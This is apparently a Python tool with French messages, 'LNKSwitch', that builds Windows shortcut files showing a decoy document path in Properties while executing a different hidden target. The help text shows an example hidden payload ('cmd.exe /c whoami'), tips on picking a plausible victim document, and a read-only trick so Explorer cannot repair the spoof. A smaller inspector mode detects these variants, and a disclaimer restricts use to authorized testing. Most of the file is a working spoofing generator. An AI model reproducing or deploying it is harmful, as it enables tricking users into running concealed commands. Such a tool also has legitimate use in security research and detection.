import argparse
import os
import struct
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Optional

HEADER_SIZE      = 0x4C
EVDB_BLOCK_SIZE  = 0x314
EVDB_SIGNATURE   = 0xA0000001
EVDB_ANSI_LEN    = 260
EVDB_UNICODE_LEN = 520

LINK_CLSID = bytes([
    0x01, 0x14, 0x02, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0xC0, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x46
])

F_HAS_IDLIST    = 0x00000001
F_HAS_LINK_INFO = 0x00000002
F_HAS_NAME      = 0x00000004
F_HAS_REL_PATH  = 0x00000008
F_HAS_WORK_DIR  = 0x00000010
F_HAS_ARGS      = 0x00000020
F_HAS_ICON      = 0x00000040
F_IS_UNICODE    = 0x00000080
F_HAS_EXP_STR   = 0x00000200

ILLEGAL_CHARS = set('<>:"/|?*')

def extract_idlist(target_path: str) -> bytes:
    if not os.path.exists(target_path):
        raise FileNotFoundError(
            f"Cible introuvable : {target_path!r}\n"
            "Le chemin doit exister sur le disque pour l'extraction de l'IDList."
        )

    tmp = tempfile.mktemp(suffix='.lnk')
    esc_target = target_path.replace("'", "''")
    esc_tmp    = tmp.replace("'", "''")

    ps_cmd = (
        "$ws = New-Object -ComObject WScript.Shell; "
        f"$sc = $ws.CreateShortcut('{esc_tmp}'); "
        f"$sc.TargetPath = '{esc_target}'; "
        "$sc.Save()"
    )

    try:
        r = subprocess.run(
            ['powershell', '-NoProfile', '-NonInteractive', '-Command', ps_cmd],
            capture_output=True, text=True, timeout=15
        )
    except FileNotFoundError:
        raise RuntimeError("PowerShell introuvable. Windows + PowerShell requis.")
    except subprocess.TimeoutExpired:
        raise RuntimeError("Délai d'exécution PowerShell dépassé.")

    if r.returncode != 0:
        raise RuntimeError(f"Échec de PowerShell :\n{r.stderr.strip()}")
    if not os.path.exists(tmp):
        raise RuntimeError("Le LNK temporaire n'a pas été créé par PowerShell... WeakShell ???")

    try:
        data = Path(tmp).read_bytes()
    finally:
        try:
            os.unlink(tmp)
        except OSError:
            pass

    if len(data) < HEADER_SIZE + 2:
        raise RuntimeError(f"LNK généré trop court : {len(data)} octets")

    gen_flags = struct.unpack_from('<I', data, 0x14)[0]
    if not (gen_flags & F_HAS_IDLIST):
        raise RuntimeError(
            "WScript.Shell n'a pas généré d'IDList pour cette cible.\n"
            "Utilisez un chemin absolu complet vers l'exécutable."
        )

    idlist_size  = struct.unpack_from('<H', data, HEADER_SIZE)[0]
    idlist_bytes = data[HEADER_SIZE + 2 : HEADER_SIZE + 2 + idlist_size]

    if len(idlist_bytes) != idlist_size:
        raise RuntimeError("IDList tronquée dans le LNK généré.")

    return idlist_bytes


def build_evdb_variant4(real_target: str) -> bytes:
    assert len(real_target) < EVDB_ANSI_LEN, \
        f"Chemin de cible réelle trop long : {len(real_target)} caractères (max {EVDB_ANSI_LEN - 1})"

    buf = bytearray(EVDB_BLOCK_SIZE)

    struct.pack_into('<I', buf, 0, EVDB_BLOCK_SIZE)
    struct.pack_into('<I', buf, 4, EVDB_SIGNATURE)

    # TargetAnsi: offset 8, 260 bytes
    ansi = real_target.encode('windows-1252', errors='replace')
    ansi = ansi[:EVDB_ANSI_LEN - 1]
    buf[8 : 8 + len(ansi)] = ansi

    assert len(buf) == EVDB_BLOCK_SIZE
    return bytes(buf)

def build_header(flags: int, show_cmd: int = 1) -> bytes:
    """Construit le ShellLinkHeader fixe de 76 octets."""
    buf = bytearray(HEADER_SIZE)
    struct.pack_into('<I', buf, 0x00, HEADER_SIZE)
    buf[0x04:0x14] = LINK_CLSID
    struct.pack_into('<I', buf, 0x14, flags)
    struct.pack_into('<I', buf, 0x18, 0x00000020)
    struct.pack_into('<I', buf, 0x3C, show_cmd)
    return bytes(buf)


def str_entry(s: str) -> bytes:
    enc = s.encode('utf-16-le')
    return struct.pack('<H', len(s)) + enc

def build_lnkswitch(
    real_target:  str,
    display_path: str,
    arguments:    Optional[str] = None,
    working_dir:  Optional[str] = None,
    icon_path:    Optional[str] = None,
    icon_index:   int = 0,
    show_cmd:     int = 1,
) -> bytes:

    print(f"  [*] Extraction de l'IDList pour le chemin affiché : {display_path}")
    display_idlist = extract_idlist(display_path)
    print(f"  [+] IDList affichée : {len(display_idlist)} octets")

    print(f"  [*] Construction EVDB : TargetAnsi={real_target!r}, TargetUnicode=NULL")
    evdb = build_evdb_variant4(real_target)

    flags = F_HAS_IDLIST | F_HAS_EXP_STR | F_IS_UNICODE
    if working_dir: flags |= F_HAS_WORK_DIR
    if arguments:   flags |= F_HAS_ARGS
    if icon_path:   flags |= F_HAS_ICON

    header  = build_header(flags, show_cmd)
    idl_sec = struct.pack('<H', len(display_idlist)) + display_idlist

    str_sec = b''
    if working_dir:
        str_sec += str_entry(working_dir)
    if arguments:
        str_sec += str_entry(arguments)
    if icon_path:
        if ',' in icon_path:
            icon_full = icon_path
        else:
            icon_full = f"{icon_path},{icon_index}" if icon_index else icon_path
        str_sec += str_entry(icon_full)

    return header + idl_sec + str_sec + evdb

def inspect_lnk(filepath: str):
    print(f"\n{'='*62}")
    print(f"  Inspecteur LNKSwitch : {os.path.basename(filepath)}")
    print(f"{'='*62}")

    data = Path(filepath).read_bytes()
    if len(data) < HEADER_SIZE + 2:
        print("[!] Fichier trop court.")
        return

    flags  = struct.unpack_from('<I', data, 0x14)[0]
    is_uni = bool(flags & F_IS_UNICODE)

    flag_names = {
        F_HAS_IDLIST:    'HasLinkTargetIDList',
        F_HAS_LINK_INFO: 'HasLinkInfo',
        F_HAS_WORK_DIR:  'HasWorkingDir',
        F_HAS_ARGS:      'HasArguments',
        F_HAS_ICON:      'HasIconLocation',
        F_IS_UNICODE:    'IsUnicode',
        F_HAS_EXP_STR:   'HasExpString',
    }
    print(f"\n  LinkFlags: {flags:#010x}")
    for bit, name in flag_names.items():
        if flags & bit:
            print(f"    + {name}")

    offset      = HEADER_SIZE
    idlist_hint = None

    if flags & F_HAS_IDLIST:
        idlist_size = struct.unpack_from('<H', data, offset)[0]
        idlist_data = data[offset + 2 : offset + 2 + idlist_size]
        offset += 2 + idlist_size

        hints = []
        for i in range(len(idlist_data) - 4):
            for drv in [b'C:\\', b'D:\\', b'E:\\', b'F:\\']:
                if idlist_data[i:].startswith(drv):
                    end = idlist_data.find(b'\x00', i)
                    candidate = idlist_data[i : end if end > i else i + 80]
                    try:
                        hints.append(candidate.decode('ascii'))
                    except UnicodeDecodeError:
                        pass
        if hints:
            idlist_hint = max(hints, key=len)

        print(f"\n  IDList  : {idlist_size} bytes")
        if idlist_hint:
            print(f"  Indice IDList (affiché dans Propriétés) : {idlist_hint!r}")

    if flags & F_HAS_LINK_INFO:
        li_size = struct.unpack_from('<I', data, offset)[0]
        offset += li_size

    for flag, label in [
        (F_HAS_NAME,     'Name'),
        (F_HAS_REL_PATH, 'RelativePath'),
        (F_HAS_WORK_DIR, 'WorkingDir'),
        (F_HAS_ARGS,     'Arguments'),
        (F_HAS_ICON,     'IconLocation'),
    ]:
        if not (flags & flag) or offset + 2 > len(data):
            continue
        count  = struct.unpack_from('<H', data, offset)[0]
        offset += 2
        nbytes = count * (2 if is_uni else 1)
        raw    = data[offset : offset + nbytes]
        val    = raw.decode('utf-16-le' if is_uni else 'windows-1252', errors='replace')
        offset += nbytes
        trunc  = val[:100] + ('...' if len(val) > 100 else '')
        print(f"  {label:<14}: {trunc!r}")
        if label == 'Arguments' and len(val) > 260:
            print(f"    ⚠  Longueur des arguments {len(val)} > 260 — padding CVE-2025-9491 possible !")

    evdb_ansi = evdb_uni = None
    while offset + 8 <= len(data):
        try:
            bsz = struct.unpack_from('<I', data, offset)[0]
            if bsz < 4:
                break
            bsg = struct.unpack_from('<I', data, offset + 4)[0]
            if bsg == EVDB_SIGNATURE and bsz == EVDB_BLOCK_SIZE:
                ar  = data[offset + 8 : offset + 8 + EVDB_ANSI_LEN]
                end = ar.find(b'\x00')
                evdb_ansi = ar[:end if end != -1 else EVDB_ANSI_LEN].decode(
                    'windows-1252', errors='replace')
                ur = data[offset + 268 : offset + 268 + EVDB_UNICODE_LEN]
                ue = 0
                while ue + 1 < len(ur) and ur[ue:ue+2] != b'\x00\x00':
                    ue += 2
                evdb_uni = ur[:ue].decode('utf-16-le', errors='replace') if ue > 0 else None
            offset += bsz
        except struct.error:
            break

    print(f"\n  EVDB ANSI   : {evdb_ansi!r}")
    print(f"  EVDB Unicode: {evdb_uni!r}")

    print(f"\n  {'─'*56}")

    if (flags & F_HAS_IDLIST) and (flags & F_HAS_EXP_STR):
        if evdb_ansi and not evdb_uni:
            print(f"  🔴  LNKSWITCH DÉTECTÉ  [Variante 4 — TargetUnicode nul]")
            print(f"       Propriétés affiche (IDList) : {idlist_hint!r}")
            print(f"       Exécute réellement (EVDB)   : {evdb_ansi!r}")
            print(f"       Le champ Cible est grisé.")
            print(f"\n       N'ouvrez pas ce fichier.")
        elif evdb_ansi:
            illegal = [c for c in evdb_ansi if c in ILLEGAL_CHARS]
            if illegal:
                visible = evdb_ansi.strip('"').strip()
                print(f"  🔴  LNKSWITCH DÉTECTÉ  [Variante 2 — chemin EVDB invalide]")
                print(f"       Caractères illégaux       : {illegal}")
                print(f"       Propriétés affiche (EVDB) : {visible!r}")
                if idlist_hint:
                    print(f"       Exécute réellement (IDL) : {idlist_hint!r}")
                print(f"\n       N'ouvrez pas ce fichier.")
            else:
                print("  🟡  HasIDList + HasExpString tous deux définis — vérification manuelle conseillée.")
        else:
            print("  🟡  HasExpString avec EVDB nul — Variante 1 possible.")
    else:
        print("  🟢  Aucune signature LNKSwitch détectée.")
    print()


# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
                description='LNKSwitch — Générateur et inspecteur de spoofing LNK Variante 4',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
⚠  Réservé à l'apprentissage et aux tests de sécurité autorisés UNIQUEMENT.

Utilise la Variante 4 : TargetAnsi=cible réelle, TargetUnicode=nul.
    - Survit aux changements d'icône par l'utilisateur (aucun caractère illégal à normaliser)
    - Le champ Cible est grisé dans Propriétés
    - Les arguments sont masqués automatiquement

PRÉREQUIS : --display doit pointer vers un fichier réel existant sur le
système cible (il devient l'IDList — Explorer doit pouvoir le résoudre pour l'affichage).
Utilisez un document plausible que la cible est susceptible d'avoir, par exemple un vrai PDF.

Exemples :

    Générer (afficher un vrai chemin PDF, exécuter calc) :
    python lnkswitch_generator.py \\
        --target    "C:\\Windows\\System32\\calc.exe" \\
        --display   "C:\\Users\\Public\\Documents\\report.pdf" \\
        --read-only \\
        --output    report.lnk

    Avec icône et charge utile masquée :
    python lnkswitch_generator.py \\
        --target     "C:\\Windows\\System32\\cmd.exe" \\
        --args       "/c whoami > C:\\Users\\Public\\out.txt" \\
        --display    "C:\\Users\\Public\\Documents\\report.pdf" \\
        --icon       "C:\\Windows\\System32\\shell32.dll,153" \\
        --minimized \\
        --read-only \\
        --output     report.lnk

    Inspecter un LNK suspect :
    python lnkswitch_generator.py --inspect suspicious.lnk
        """
    )

    parser.add_argument('--inspect', metavar='FILE',
                        help='Inspecter un LNK existant à la recherche d’indicateurs de spoofing')
    parser.add_argument('--target', metavar='PATH',
                        help='Vraie cible d’exécution (placée dans EVDB TargetAnsi)')
    parser.add_argument('--display', metavar='PATH',
                        help='Chemin affiché dans Propriétés (placé dans IDList — doit exister sur le disque)')
    parser.add_argument('--output', metavar='FILE', default='output.lnk')
    parser.add_argument('--args', metavar='STRING',
                        help='Arguments de ligne de commande (masqués automatiquement dans Propriétés)')
    parser.add_argument('--working-dir', metavar='PATH')
    parser.add_argument('--icon', metavar='PATH[,INDEX]',
                        help='Chemin de l’icône, avec index optionnel (ex. shell32.dll,153)')
    parser.add_argument('--icon-index', metavar='N', type=int, default=0,
                        help='Index de l’icône (utilisé seulement si --icon ne contient pas de virgule)')
    parser.add_argument('--minimized', action='store_true',
                        help='Lancer la cible minimisée/cachée (ShowCommand=7)')
    parser.add_argument('--read-only', action='store_true',
                        help='Appliquer FILE_ATTRIBUTE_READONLY au LNK de sortie afin qu’Explorer '
                            'ne puisse pas corriger le décalage ansi/unicode après la première exécution. '
                            'Sans ce drapeau, le spoof est détruit au premier clic.')
    parser.add_argument('--dry-run', action='store_true',
                        help='Assembler sans écrire sur le disque')

    args = parser.parse_args()

    if args.inspect:
        if not os.path.exists(args.inspect):
            print(f"[!] Fichier introuvable : {args.inspect}")
            sys.exit(1)
        inspect_lnk(args.inspect)
        sys.exit(0)

    if not args.target or not args.display:
        parser.error("--target et --display sont tous deux requis.")

    show_cmd = 7 if args.minimized else 1

    print()
    print("  Générateur LNKSwitch  [Variante 4]")
    print("  ─────────────────────────────────")
    print(f"  Cible réelle  : {args.target}  (masquée — EVDB TargetAnsi)")
    print(f"  Chemin affiché: {args.display}  (visible — IDList)")
    print(f"  Sortie        : {args.output}")
    if args.args:        print(f"  Arguments     : {args.args}  (masqués automatiquement)")
    if args.working_dir: print(f"  Répertoire    : {args.working_dir}")
    if args.icon:
        icon_display = args.icon if ',' in args.icon else f"{args.icon},{args.icon_index}"
        print(f"  Icône         : {icon_display}")
    print()

    try:
        lnk = build_lnkswitch(
            real_target  = args.target,
            display_path = args.display,
            arguments    = args.args,
            working_dir  = args.working_dir,
            icon_path    = args.icon,
            icon_index   = args.icon_index,
            show_cmd     = show_cmd,
        )
    except (FileNotFoundError, RuntimeError) as e:
        print(f"\n  [!] Erreur : {e}")
        sys.exit(1)

    if args.dry_run:
        print(f"  [~] Exécution à blanc — {len(lnk)} octets, non écrit.")
        sys.exit(0)

    out = Path(args.output)
    out.write_bytes(lnk)

    if args.read_only:
        # Set FILE_ATTRIBUTE_READONLY so Explorer cannot repair the LNK
        # after execution. Without this, Explorer rewrites the file on first
        # click, fixing the ansi/unicode mismatch and destroying the spoof.
        import stat
        current = os.stat(out).st_mode
        os.chmod(out, current & ~stat.S_IWRITE)
        ro_note = "  (lecture seule — le spoof survit aux clics répétés)"
    else:
        ro_note = "  (modifiable — Explorer corrigera au premier clic)"

    print(f"  [+] Écrit : {out.resolve()}  ({len(lnk)} octets)")
    print()
    print("  Résumé")
    print("  ──────────────")
    print(f"  La boîte Propriétés affiche : {args.display!r}")
    print(f"  Champ Cible                 : grisé (non modifiable)")
    print(f"  Le double-clic exécute      : {args.target!r}")
    if args.args:
        print(f"  Arguments                   : masqués dans Propriétés")
    print(f"  Attribut du fichier         :{ro_note}")
    print()


if __name__ == '__main__':
    main()